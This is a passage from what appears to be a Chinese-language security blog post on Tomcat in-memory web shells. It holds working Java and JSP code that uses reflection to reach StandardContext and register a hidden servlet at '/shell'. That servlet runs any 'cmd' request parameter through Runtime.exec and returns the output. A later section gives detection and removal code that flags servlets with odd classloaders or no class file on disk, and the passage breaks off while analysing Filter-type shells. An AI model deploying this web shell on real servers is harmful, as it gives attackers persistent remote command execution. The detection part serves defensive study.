class="line">        Class n=start.getClass();</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (Field declaredField : n.getDeclaredFields()) &#123;</span><br><span class="line">                declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    o = declaredField.get(start);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(!o.getClass().isArray())&#123;</span><br><span class="line">                        p(o,depth);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">for</span> (Object q : (Object[]) o) &#123;</span><br><span class="line">                            p(q, depth);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">while</span>(</span><br><span class="line">                (n = n.getSuperclass())!=<span class="literal">null</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">AddMemoryShell</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">EvilWrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">            <span class="comment">//(重要！)此处不利用无参构造方法获得EvilTemplatesImpl对象是避免循环执行无参构造方法中的代码！</span></span><br><span class="line">            <span class="type">Servlet</span> <span class="variable">evilServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilTemplatesImpl1</span>(<span class="string">&quot;rainb0w&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> evilServlet.getClass().getSimpleName();</span><br><span class="line">            EvilWrapper.setName(ClassName);</span><br><span class="line">            EvilWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">            EvilWrapper.setServlet(evilServlet);</span><br><span class="line">            EvilWrapper.setServletClass(evilServlet.getClass().getName());</span><br><span class="line"></span><br><span class="line">            standardContext.addChild(EvilWrapper);</span><br><span class="line">            standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>, ClassName);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读代码，可以看到我们这里判断是否获取到了当前请求的request对象时，是通过判断当前请求是否存在rainb0w请求头来进行的。如果能够获取到当前请求的request对象，那么就通过反射获取到当前请求的response对象。接着传入到AddMemoryShell方法用于获取StandardContext。因此我们在传入生成的payload的时候就需要发送rainb0w请求头：</p><p><a href="https://pic.imgdb.cn/item/64d26d921ddac507cc043fe8.jpg" title="image-20230803121203786" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d921ddac507cc043fe8.jpg" alt="image-20230803121203786"></a></p><p>因为通过这种方法获取request对象不稳定，因此可能需要传入多次payload。</p><h4 id="上传jsp注入Tomcat-Servlet内存马"><a href="#上传jsp注入Tomcat-Servlet内存马" class="headerlink" title="上传jsp注入Tomcat-Servlet内存马"></a>上传jsp注入Tomcat-Servlet内存马</h4><p>相比反序列化传入字节码注入内存马相比，上传jsp的方法则要简单的多，因此jsp中内置request对象，我们可以直接用内置的request对象反射获得StandardContext：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletShell</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span>(command == <span class="literal">null</span>)&#123;</span><br><span class="line">                command = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br><span class="line">            br = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">stringBuffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine())!=<span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                stringBuffer.append(line + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            out.println(stringBuffer.toString());;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">( )</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextFiled</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextFiled.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextFiled</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextFiled.get(applicationContext);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    <span class="type">ServletShell</span> <span class="variable">servletShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletShell</span>();</span><br><span class="line">    wrapper.setName(servletShell.getClass().getSimpleName());</span><br><span class="line">    wrapper.setServlet(servletShell);</span><br><span class="line">    wrapper.setServletClass(servletShell.getClass().getName());</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>, servletShell.getClass().getSimpleName());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h4 id="Tomcat-Servlet-型内存马查杀"><a href="#Tomcat-Servlet-型内存马查杀" class="headerlink" title="Tomcat-Servlet 型内存马查杀"></a>Tomcat-Servlet 型内存马查杀</h4><p>和Servlet相关的是<code>children</code>和<code>servletMappings</code>两个属性，这两个属性分别维护着Servlet的定义，以及Servlet的映射关系。在StandardContext中有removeChild()方法来删除指定的Wrapper：</p><p><a href="https://pic.imgdb.cn/item/64d26dce1ddac507cc04deeb.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26dce1ddac507cc04deeb.jpg"></a></p><p>org.apache.catalina.core.StandardContext#removeServletMapping方法通过指定的pattern删除Servlet映射。</p><p><a href="https://pic.imgdb.cn/item/64d26ddf1ddac507cc05078b.jpg" title="image-20230808142716599" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26ddf1ddac507cc05078b.jpg" alt="image-20230808142716599"></a></p><p>有了这两个方法我们就可以删除掉指定的Servlet了。那我们该怎么知道哪些类是内存马需要被删除呢？有以下几种判断方法：</p><ul><li><p>判断该Class是否有对应的磁盘文件</p></li><li><p>dump Class字节码，反编译审计是否存在恶意代码</p></li><li><p>是否被可疑的ClassLoader所加载？</p></li><li><p>根据Class名及urlpattern判断</p></li></ul><p>以下给出查杀代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Container&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardWrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URL&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Iterator&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getStandardContext</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">applicationContextFiled</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        applicationContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextFiled.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">standardContextFiled</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        standardContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextFiled.get(applicationContext);</span><br><span class="line">        <span class="keyword">return</span> standardContext;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> HashMap&lt;String, Container&gt; <span class="title function_">getChildren</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">standardContext</span> <span class="operator">=</span> getStandardContext(request);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">childrenFiled</span> <span class="operator">=</span> standardContext.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;children&quot;</span>);</span><br><span class="line">        childrenFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        HashMap&lt;String, Container&gt; children = (HashMap&lt;String, Container&gt;) childrenFiled.get(standardContext);</span><br><span class="line">        <span class="keyword">return</span> children;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> HashMap&lt;String, String&gt; <span class="title function_">getServletMaps</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">standardContext</span> <span class="operator">=</span> getStandardContext(request);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">servletMappingsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;servletMappings&quot;</span>);</span><br><span class="line">        servletMappingsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        HashMap&lt;String, String&gt; servletMappings = (HashMap&lt;String, String&gt;) servletMappingsField.get(standardContext);</span><br><span class="line">        <span class="keyword">return</span> servletMappings;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">classFileIsExists</span><span class="params">(Class clazz)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> clazz.getName();</span><br><span class="line">        <span class="type">String</span> <span class="variable">classNamePath</span> <span class="operator">=</span> className.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> clazz.getClassLoader().getResource(classNamePath);</span><br><span class="line">        <span class="keyword">if</span> (url == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isMemoryShell</span><span class="params">(String servletClassLoaderName, Class servletClass)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>((!servletClassLoaderName.contains(<span class="string">&quot;org.apache.catalina.loader&quot;</span>) &amp;&amp; !servletClassLoaderName.equals(<span class="string">&quot;java.net.URLClassLoader&quot;</span>)) || !classFileIsExists(servletClass))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">deleteServlet</span><span class="params">(HttpServletRequest request, String servletName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;String, Container&gt; childs = getChildren(request);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">objChild</span> <span class="operator">=</span> childs.get(servletName);</span><br><span class="line">        <span class="type">String</span> <span class="variable">urlPattern</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        HashMap&lt;String, String&gt; servletMaps = getServletMaps(request);</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; servletMap : servletMaps.entrySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (servletMap.getValue().equals(servletName)) &#123;</span><br><span class="line">                urlPattern = servletMap.getKey();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (urlPattern != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 反射调用 org.apache.catalina.core.StandardContext#removeServletMapping</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">standardContext</span> <span class="operator">=</span> getStandardContext(request);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">removeServletMapping</span> <span class="operator">=</span> standardContext.getClass().getDeclaredMethod(<span class="string">&quot;removeServletMapping&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;);</span><br><span class="line">            removeServletMapping.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            removeServletMapping.invoke(standardContext, urlPattern);</span><br><span class="line">            <span class="comment">// 反射调用 org.apache.catalina.core.StandardContext#removeChild</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">removeChild</span> <span class="operator">=</span> standardContext.getClass().getDeclaredMethod(<span class="string">&quot;removeChild&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;org.apache.catalina.Container.class&#125;);</span><br><span class="line">            removeChild.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            removeChild.invoke(standardContext, objChild);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    HashMap&lt;String, Container&gt; children = getChildren(request);</span><br><span class="line">    Map&lt;String, String&gt; servletMappings = getServletMaps(request);</span><br><span class="line">    Map&lt;String, String&gt; servletMappingsCopy = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(servletMappings);</span><br><span class="line">    <span class="keyword">for</span>(Map.Entry&lt;String, String&gt; entry : servletMappingsCopy.entrySet())&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">servletMapPath</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">        <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">        <span class="type">StandardWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (StandardWrapper) children.get(servletName);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">servletClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            servletClass = Class.forName(wrapper.getServletClass());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">servlet</span> <span class="operator">=</span> wrapper.getServlet();</span><br><span class="line">            <span class="keyword">if</span> (servlet != <span class="literal">null</span>) &#123;</span><br><span class="line">                servletClass = servlet.getClass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (servletClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            out.write(<span class="string">&quot;&lt;tr&gt;&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">servletClassName</span> <span class="operator">=</span> servletClass.getName();</span><br><span class="line">            <span class="type">String</span> <span class="variable">servletClassLoaderName</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                servletClassLoaderName = servletClass.getClassLoader().getClass().getName();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(isMemoryShell(servletClassLoaderName, servletClass))&#123;</span><br><span class="line">                deleteServlet(request, servletName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>代码很容易理解，稍微解释一下吧。首先获取children属性和servletMappings属性，之后不断遍历servletMappings，获取ClassName以及ClassLoaderName，之后调用isMemoryShell函数判断是否为内存马，如果是内存马则删除，以下是isMemoryShell函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isMemoryShell</span><span class="params">(String servletClassLoaderName, Class servletClass)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>((!servletClassLoaderName.contains(<span class="string">&quot;org.apache.catalina.loader&quot;</span>) &amp;&amp; !servletClassLoaderName.equals(<span class="string">&quot;java.net.URLClassLoader&quot;</span>)) || !classFileIsExists(servletClass))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>判断逻辑很简单粗暴，判断是否是一个正常的ClassLoader以及该Class是否有对应的磁盘文件。</p><h3 id="Tomcat-Filter-型内存马"><a href="#Tomcat-Filter-型内存马" class="headerlink" title="Tomcat-Filter 型内存马"></a>Tomcat-Filter 型内存马</h3><h4 id="流程分析-1"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h4><p>写一个简单的Filter：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcatservletmemshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpFilter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;helloFIlter&quot;, urlPatterns = &quot;/hello-servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloFilter</span> <span class="keyword">extends</span> <span class="title class_">HttpFilter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> java.io.IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;rainb0w&quot;</span>);;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 把请求传回过滤链</span></span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">( )</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因为我们是通过注解的方式添加了一个Filter，因此我们需要找一下该注解的处理位置，首先利用maven下载源代码，之后全局搜索：</p><p><a 